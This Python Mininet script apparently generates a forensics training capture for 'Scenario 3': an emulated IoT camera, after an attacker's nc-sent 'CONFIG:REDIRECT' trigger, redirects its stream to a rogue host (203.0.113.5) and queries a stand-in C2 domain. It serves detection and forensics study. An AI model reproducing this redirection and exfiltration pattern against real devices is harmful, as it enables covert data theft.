#!/usr/bin/env python3
"""
=============================================================================
Network Forensics Project — Scenario 3: Rogue Redirection and Exfiltration
=============================================================================
"""

import argparse
import sys
import time
import subprocess
import os
import signal  

from mininet.net    import Mininet
from mininet.node   import OVSSwitch, OVSController
from mininet.link   import TCLink
from mininet.log    import setLogLevel, info, error
from mininet.cli    import CLI
from mininet.clean  import cleanup

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
DEFAULT_DURATION     = 1200
DEFAULT_PCAP_PATH    = "pcaps/originals/scenario3_exfiltration.pcap"
CAMERA_PORT          = 50005        
MQTT_PORT            = 8883         
NTP_PORT             = 123          
DNS_PORT             = 53           
TLS_PORT             = 443          
EXFIL_PORT           = 443
KEEPALIVE_INTERVAL   = 10           
TEMPERATURE_INTERVAL = 300          
NTP_INTERVAL         = 600          
DNS_INTERVAL         = 60           
TLS_INTERVAL         = 300          
CAPTURE_GRACE_SEC    = 3            
PHASE1_DURATION      = 300
CLOUD_IP             = "10.0.0.254"
ROGUE_CLOUD_IP        = "203.0.113.5"
ROGUE_GW_IP           = "203.0.113.1"
LEGIT_CAMERA_DOMAIN   = "api.smartcamera.local"
MALICIOUS_C2_DOMAIN   = "c2.malicious-exfil.com"
UDP_BANDWIDTH        = "4000K" # 500KB/s, simulating a modern 1080p camera upload
BEHAVIOURS_DIR        = os.path.join(os.path.dirname(__file__), "iot_behaviours")
MQTT_KEEPALIVE_SCRIPT = os.path.join(BEHAVIOURS_DIR, "mqtt_keepalive.py")
MQTT_TEMP_SCRIPT      = os.path.join(BEHAVIOURS_DIR, "mqtt_temperature.py")
NTP_SYNC_SCRIPT       = os.path.join(BEHAVIOURS_DIR, "ntp_sync.py")
DNS_QUERY_SCRIPT      = os.path.join(BEHAVIOURS_DIR, "dns_query.py")
CAMERA_TLS_SCRIPT     = os.path.join(BEHAVIOURS_DIR, "camera_tls_telemetry.py")
CAMERA_UDP_SCRIPT     = os.path.join(BEHAVIOURS_DIR, "camera_udp_stream.py")


# ---------------------------------------------------------------------------
# Topology builder
# ---------------------------------------------------------------------------
def build_topology():
    info("*** Cleaning up any previous Mininet state\n")
    cleanup()

    # Kill any zombie iperf3 servers from previous runs
    subprocess.run("killall -9 iperf3", shell=True, stderr=subprocess.DEVNULL)

    info("*** Creating Mininet network\n")
    net = Mininet(
        controller=OVSController,
        switch=OVSSwitch,
        link=TCLink,
        autoSetMacs=True,
        autoStaticArp=True,
    )

    info("*** Adding controller\n")
    net.addController("c0")

    info("*** Adding OVS switches\n")
    internal_sw = net.addSwitch("s1", cls=OVSSwitch, failMode="standalone")
    external_sw = net.addSwitch("s2", cls=OVSSwitch, failMode="standalone")

    info("*** Adding hosts\n")
    camera      = net.addHost("camera",      ip="10.0.0.1/24", mac="00:00:00:00:00:01")
    thermostat  = net.addHost("thermostat",  ip="10.0.0.2/24", mac="00:00:00:00:00:02")
    attacker    = net.addHost("attacker",    ip="10.0.0.3/24", mac="00:00:00:00:00:03")
    gateway     = net.addHost("gateway",     ip="10.0.0.254/24", mac="00:00:00:00:00:FF")
    rogue_cloud = net.addHost("rogue", ip=f"{ROGUE_CLOUD_IP}/24", mac="00:00:00:00:00:EE")

    info("*** Creating links\n")
    net.addLink(camera,     internal_sw)
    net.addLink(thermostat, internal_sw)
    net.addLink(attacker,   internal_sw)
    net.addLink(gateway,    internal_sw)
    net.addLink(gateway,    external_sw)
    net.addLink(rogue_cloud, external_sw)

    info("*** Starting network\n")
    net.start()

    gateway.setIP("10.0.0.254/24", intf="gateway-eth0")
    gateway.setIP(f"{ROGUE_GW_IP}/24", intf="gateway-eth1")
    gateway.cmd("sysctl -w net.ipv4.ip_forward=1 > /dev/null")

    for node in (camera, thermostat, attacker):
        node.cmd("ip route replace default via 10.0.0.254")

    rogue_cloud.cmd(f"ip route replace default via {ROGUE_GW_IP}")

    net.pingAll()

    return net, gateway, camera, thermostat, attacker, rogue_cloud


# ---------------------------------------------------------------------------
# The Target Servers (Dummy Listeners)
# ---------------------------------------------------------------------------
def start_gateway_services(gateway):
    info("*** [gateway] Starting dummy listeners (DNS, NTP, TLS, MQTT)\n")
    
    dns_cmd = (
        f"dnsmasq -k -p {DNS_PORT} --listen-address={CLOUD_IP} "
        f"--address=/{LEGIT_CAMERA_DOMAIN}/{CLOUD_IP} "
        f"--address=/mqtt.smartthermostat.com/10.0.0.2 "
        f"> /dev/null 2>&1 &"
    )
    gateway.cmd(dns_cmd)
    gateway.cmd(f"nc -k -l {MQTT_PORT} > /dev/null 2>&1 &")
    gateway.cmd(f"nc -k -l {TLS_PORT} > /dev/null 2>&1 &")
    
    gateway.cmd(f"python3 -c 'import socket, time; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.bind((\"\", {NTP_PORT})); time.sleep(99999)' &")
    
    # Use bash redirection instead of --logfile
    gateway.cmd(
        f"iperf3 -s -p {CAMERA_PORT} > /tmp/iperf3_server_cloud.log 2>&1 &"
    )

    info("*** [gateway] Waiting 2 seconds for servers to bind to ports...\n")
    time.sleep(2)

def start_rogue_cloud_listener(rogue_cloud):
    info("*** [rogue_cloud] Starting exfiltration listener (UDP on 443)\n")
    rogue_cloud.cmd(
        f"iperf3 -s -p {EXFIL_PORT} > /tmp/iperf3_server_rogue.log 2>&1 &"
    )

def start_camera_control_listener(camera):
    info("*** [camera] Starting control listener on 443\n")
    camera.cmd("nc -k -l 443 > /tmp/camera_control.log 2>&1 &")
    

# ---------------------------------------------------------------------------
# Traffic generators
# ---------------------------------------------------------------------------
def start_camera_udp_stream(camera, target_ip: str, port: int, duration: int):
    info("*** [camera] Starting UDP video-feed stream\n")
    camera.cmd(
        f"python3 {CAMERA_UDP_SCRIPT} {target_ip} {port} {UDP_BANDWIDTH} {duration} "
        f"> /tmp/iperf3_client_camera.log 2>&1 &"
    )

def stop_camera_udp_stream(camera):
    camera.cmd("pkill -f camera_udp_stream.py > /dev/null 2>&1 || true")

def start_thermostat_keepalive(thermostat, target_ip: str, duration: int):
    info("*** [thermostat] Starting MQTT keep-alive simulation\n")

    thermostat.cmd(
        f"python3 {MQTT_KEEPALIVE_SCRIPT} {target_ip} {MQTT_PORT} {KEEPALIVE_INTERVAL} {duration} "
        f"> /tmp/thermostat_keepalive.log 2>&1 &"
    )

def start_thermostat_temperature_report(thermostat, target_ip: str, duration: int):
    info("*** [thermostat] Starting MQTT temperature report simulation\n")
    thermostat.cmd(
        f"python3 {MQTT_TEMP_SCRIPT} {target_ip} {MQTT_PORT} {TEMPERATURE_INTERVAL} {duration} "
        f"> /tmp/thermostat_temperature.log 2>&1 &"
    )

def start_ntp_sync(node, target_ip: str, duration: int):
    info(f"*** [{node.name}] Starting simulated NTP sync\n")
    node.cmd(
        f"python3 {NTP_SYNC_SCRIPT} {target_ip} {NTP_PORT} {NTP_INTERVAL} {duration} "
        f"> /tmp/{node.name}_ntp_sync.log 2>&1 &"
    )

def start_dns_queries(node, target_ip: str, domain: str, duration: int):
    info(f"*** [{node.name}] Starting simulated DNS queries for {domain}\n")
    node.cmd(
        f"python3 {DNS_QUERY_SCRIPT} {target_ip} {domain} {DNS_PORT} {DNS_INTERVAL} {duration} "
        f"> /tmp/{node.name}_dns_query.log 2>&1 &"
    )

def start_camera_tls_telemetry(camera, target_ip: str, duration: int):
    info(f"*** [camera] Starting simulated TLS telemetry\n")
    camera.cmd(
        f"python3 {CAMERA_TLS_SCRIPT} {target_ip} {TLS_PORT} {TLS_INTERVAL} {duration} "
        f"> /tmp/camera_tls_telemetry.log 2>&1 &"
    )

def attacker_activity(attacker):
    info("*** [attacker] Standing by for trigger\n")

def send_malicious_payload(attacker, camera_ip: str):
    info("*** [attacker] Sending malicious TLS payload to camera:443\n")
    attacker.cmd(
        f"printf 'CONFIG:REDIRECT' | nc -w 1 {camera_ip} {TLS_PORT} > /dev/null 2>&1 &"
    )


# ---------------------------------------------------------------------------
# Capture Handling 
# ---------------------------------------------------------------------------
def launch_tcpdump(pcap_path: str):
    abs_path = os.path.abspath(pcap_path)
    os.makedirs(os.path.dirname(abs_path) or ".", exist_ok=True)
    
    info(f"*** Starting forensic network tap → {abs_path}\n")

    cmd = [
        "tcpdump",
        "-Z", "root",           
        "-i", "any",            
        "-U",                   
        "-w", "-",              
        "net", "10.0.0.0/24",
        "or",
        "net", "203.0.113.0/24"
    ]
    
    errlog = f"/tmp/tcpdump_{os.path.basename(pcap_path)}.log"
    
    try:
        outfile = open(abs_path, "wb")
        el = open(errlog, "wb")
        
        proc = subprocess.Popen(cmd, stdout=outfile, stderr=el)
        time.sleep(1)
        
        if proc.poll() is not None:
            el.close()
            outfile.close()
            with open(errlog, "r") as f:
                err_details = f.read().strip()
                
            error(f"*** FATAL: tcpdump exited immediately!\n")
            error(f"*** Reason: {err_details}\n")
            return None, None
            
        info(f"*** tcpdump pid={proc.pid} capturing successfully. Stderr log: {errlog}\n")
        return proc, outfile
        
    except Exception as e:
        error(f"*** Error starting tcpdump: {e}\n")
        return None, None

def stop_gateway_capture(proc, file_obj, pcap_path):
    # Send SIGINT gracefully, allowing tcpdump to finish writing the file
    if proc and proc.poll() is None:
        try:
            proc.send_signal(signal.SIGINT)
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass

    time.sleep(1)

    # Explicitly close the file object to flush the buffer
    if file_obj and not file_obj.closed:
        file_obj.close()

    # Check the actual string path, not the Python file object
    if pcap_path and os.path.exists(pcap_path):
        subprocess.run(f"chmod 666 {pcap_path}", shell=True)
        info(f"*** Capture successfully finalized: {pcap_path} ({os.path.getsize(pcap_path)} bytes)\n")
    else:
        error("*** No capture file found!\n")

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def parse_args():
    parser = argparse.ArgumentParser(description="Scenario 3 — Rogue Redirection and Exfiltration")
    parser.add_argument("--duration", "-d", type=int, default=DEFAULT_DURATION)
    parser.add_argument("--pcap", "-p", type=str, default=DEFAULT_PCAP_PATH)
    return parser.parse_args()

def run_scenario(args):
    setLogLevel("info")
    info("=" * 70 + "\n")
    info(" Scenario 3 — Rogue Redirection and Exfiltration\n")
    info("=" * 70 + "\n")
    
    net, gateway, camera, thermostat, attacker, rogue_cloud = build_topology()
    tcpdump_proc, pcap_file_obj = launch_tcpdump(args.pcap)
    
    info("\n*** Starting traffic generators\n")
    start_gateway_services(gateway)
    start_rogue_cloud_listener(rogue_cloud)
    start_camera_control_listener(camera)
   
    start_dns_queries(thermostat, CLOUD_IP, "mqtt.smartthermostat.com", args.duration)
    start_thermostat_keepalive(thermostat, CLOUD_IP, args.duration)
    start_thermostat_temperature_report(thermostat, CLOUD_IP, args.duration)
    start_ntp_sync(thermostat, CLOUD_IP, args.duration)
    
    start_dns_queries(camera, CLOUD_IP, LEGIT_CAMERA_DOMAIN, args.duration)
    start_camera_udp_stream(camera, CLOUD_IP, CAMERA_PORT, args.duration)
    start_camera_tls_telemetry(camera, CLOUD_IP, args.duration)
    start_ntp_sync(camera, CLOUD_IP, args.duration)

    attacker_activity(attacker)
    
    if args.duration == 0:
        info("\n*** Dropping into interactive CLI (duration=0)\n")
        CLI(net)
    else:
        info(f"\n*** Scenario running for {args.duration} seconds …\n")
        scenario_start = time.monotonic()
        triggered = False
        try:
            last_reported = 0
            while True:
                elapsed = int(time.monotonic() - scenario_start)
                remaining = args.duration - elapsed
                if remaining <= 0:
                    break

                if not triggered and elapsed >= PHASE1_DURATION:
                    triggered = True
                    info("\n*** Phase 2 trigger: attacker payload + camera redirect\n")
                    send_malicious_payload(attacker, camera.IP())
                    stop_camera_udp_stream(camera)
                    camera.cmd("pkill -f dns_query.py > /dev/null 2>&1 || true")

                    remaining_after_trigger = max(0, args.duration - elapsed)
                    start_camera_udp_stream(camera, ROGUE_CLOUD_IP, EXFIL_PORT, remaining_after_trigger)
                    start_dns_queries(camera, CLOUD_IP, MALICIOUS_C2_DOMAIN, remaining_after_trigger)

                sleep_time = min(1, remaining)
                time.sleep(sleep_time)
                if elapsed != last_reported and elapsed % 10 == 0:
                    info(f"    [{elapsed:4d}/{args.duration}s] Scenario 3 running\n")
                    last_reported = elapsed
        except KeyboardInterrupt:
            info("\n*** Interrupted by user\n")
    
    if args.duration > 0:
        info(f"\n*** Grace period: {CAPTURE_GRACE_SEC}s to flush trailing packets\n")
        time.sleep(CAPTURE_GRACE_SEC)

    info("\n*** Stopping scenario\n")
    # Passes the process, the open python file object, and the string path
    stop_gateway_capture(tcpdump_proc, pcap_file_obj, args.pcap)
    net.stop()
    info("=" * 70 + "\n")

if __name__ == "__main__":
    args = parse_args()
    if os.geteuid() != 0:
        print("[ERROR] This script must be run with sudo / as root.")
        sys.exit(1)
    run_scenario(args)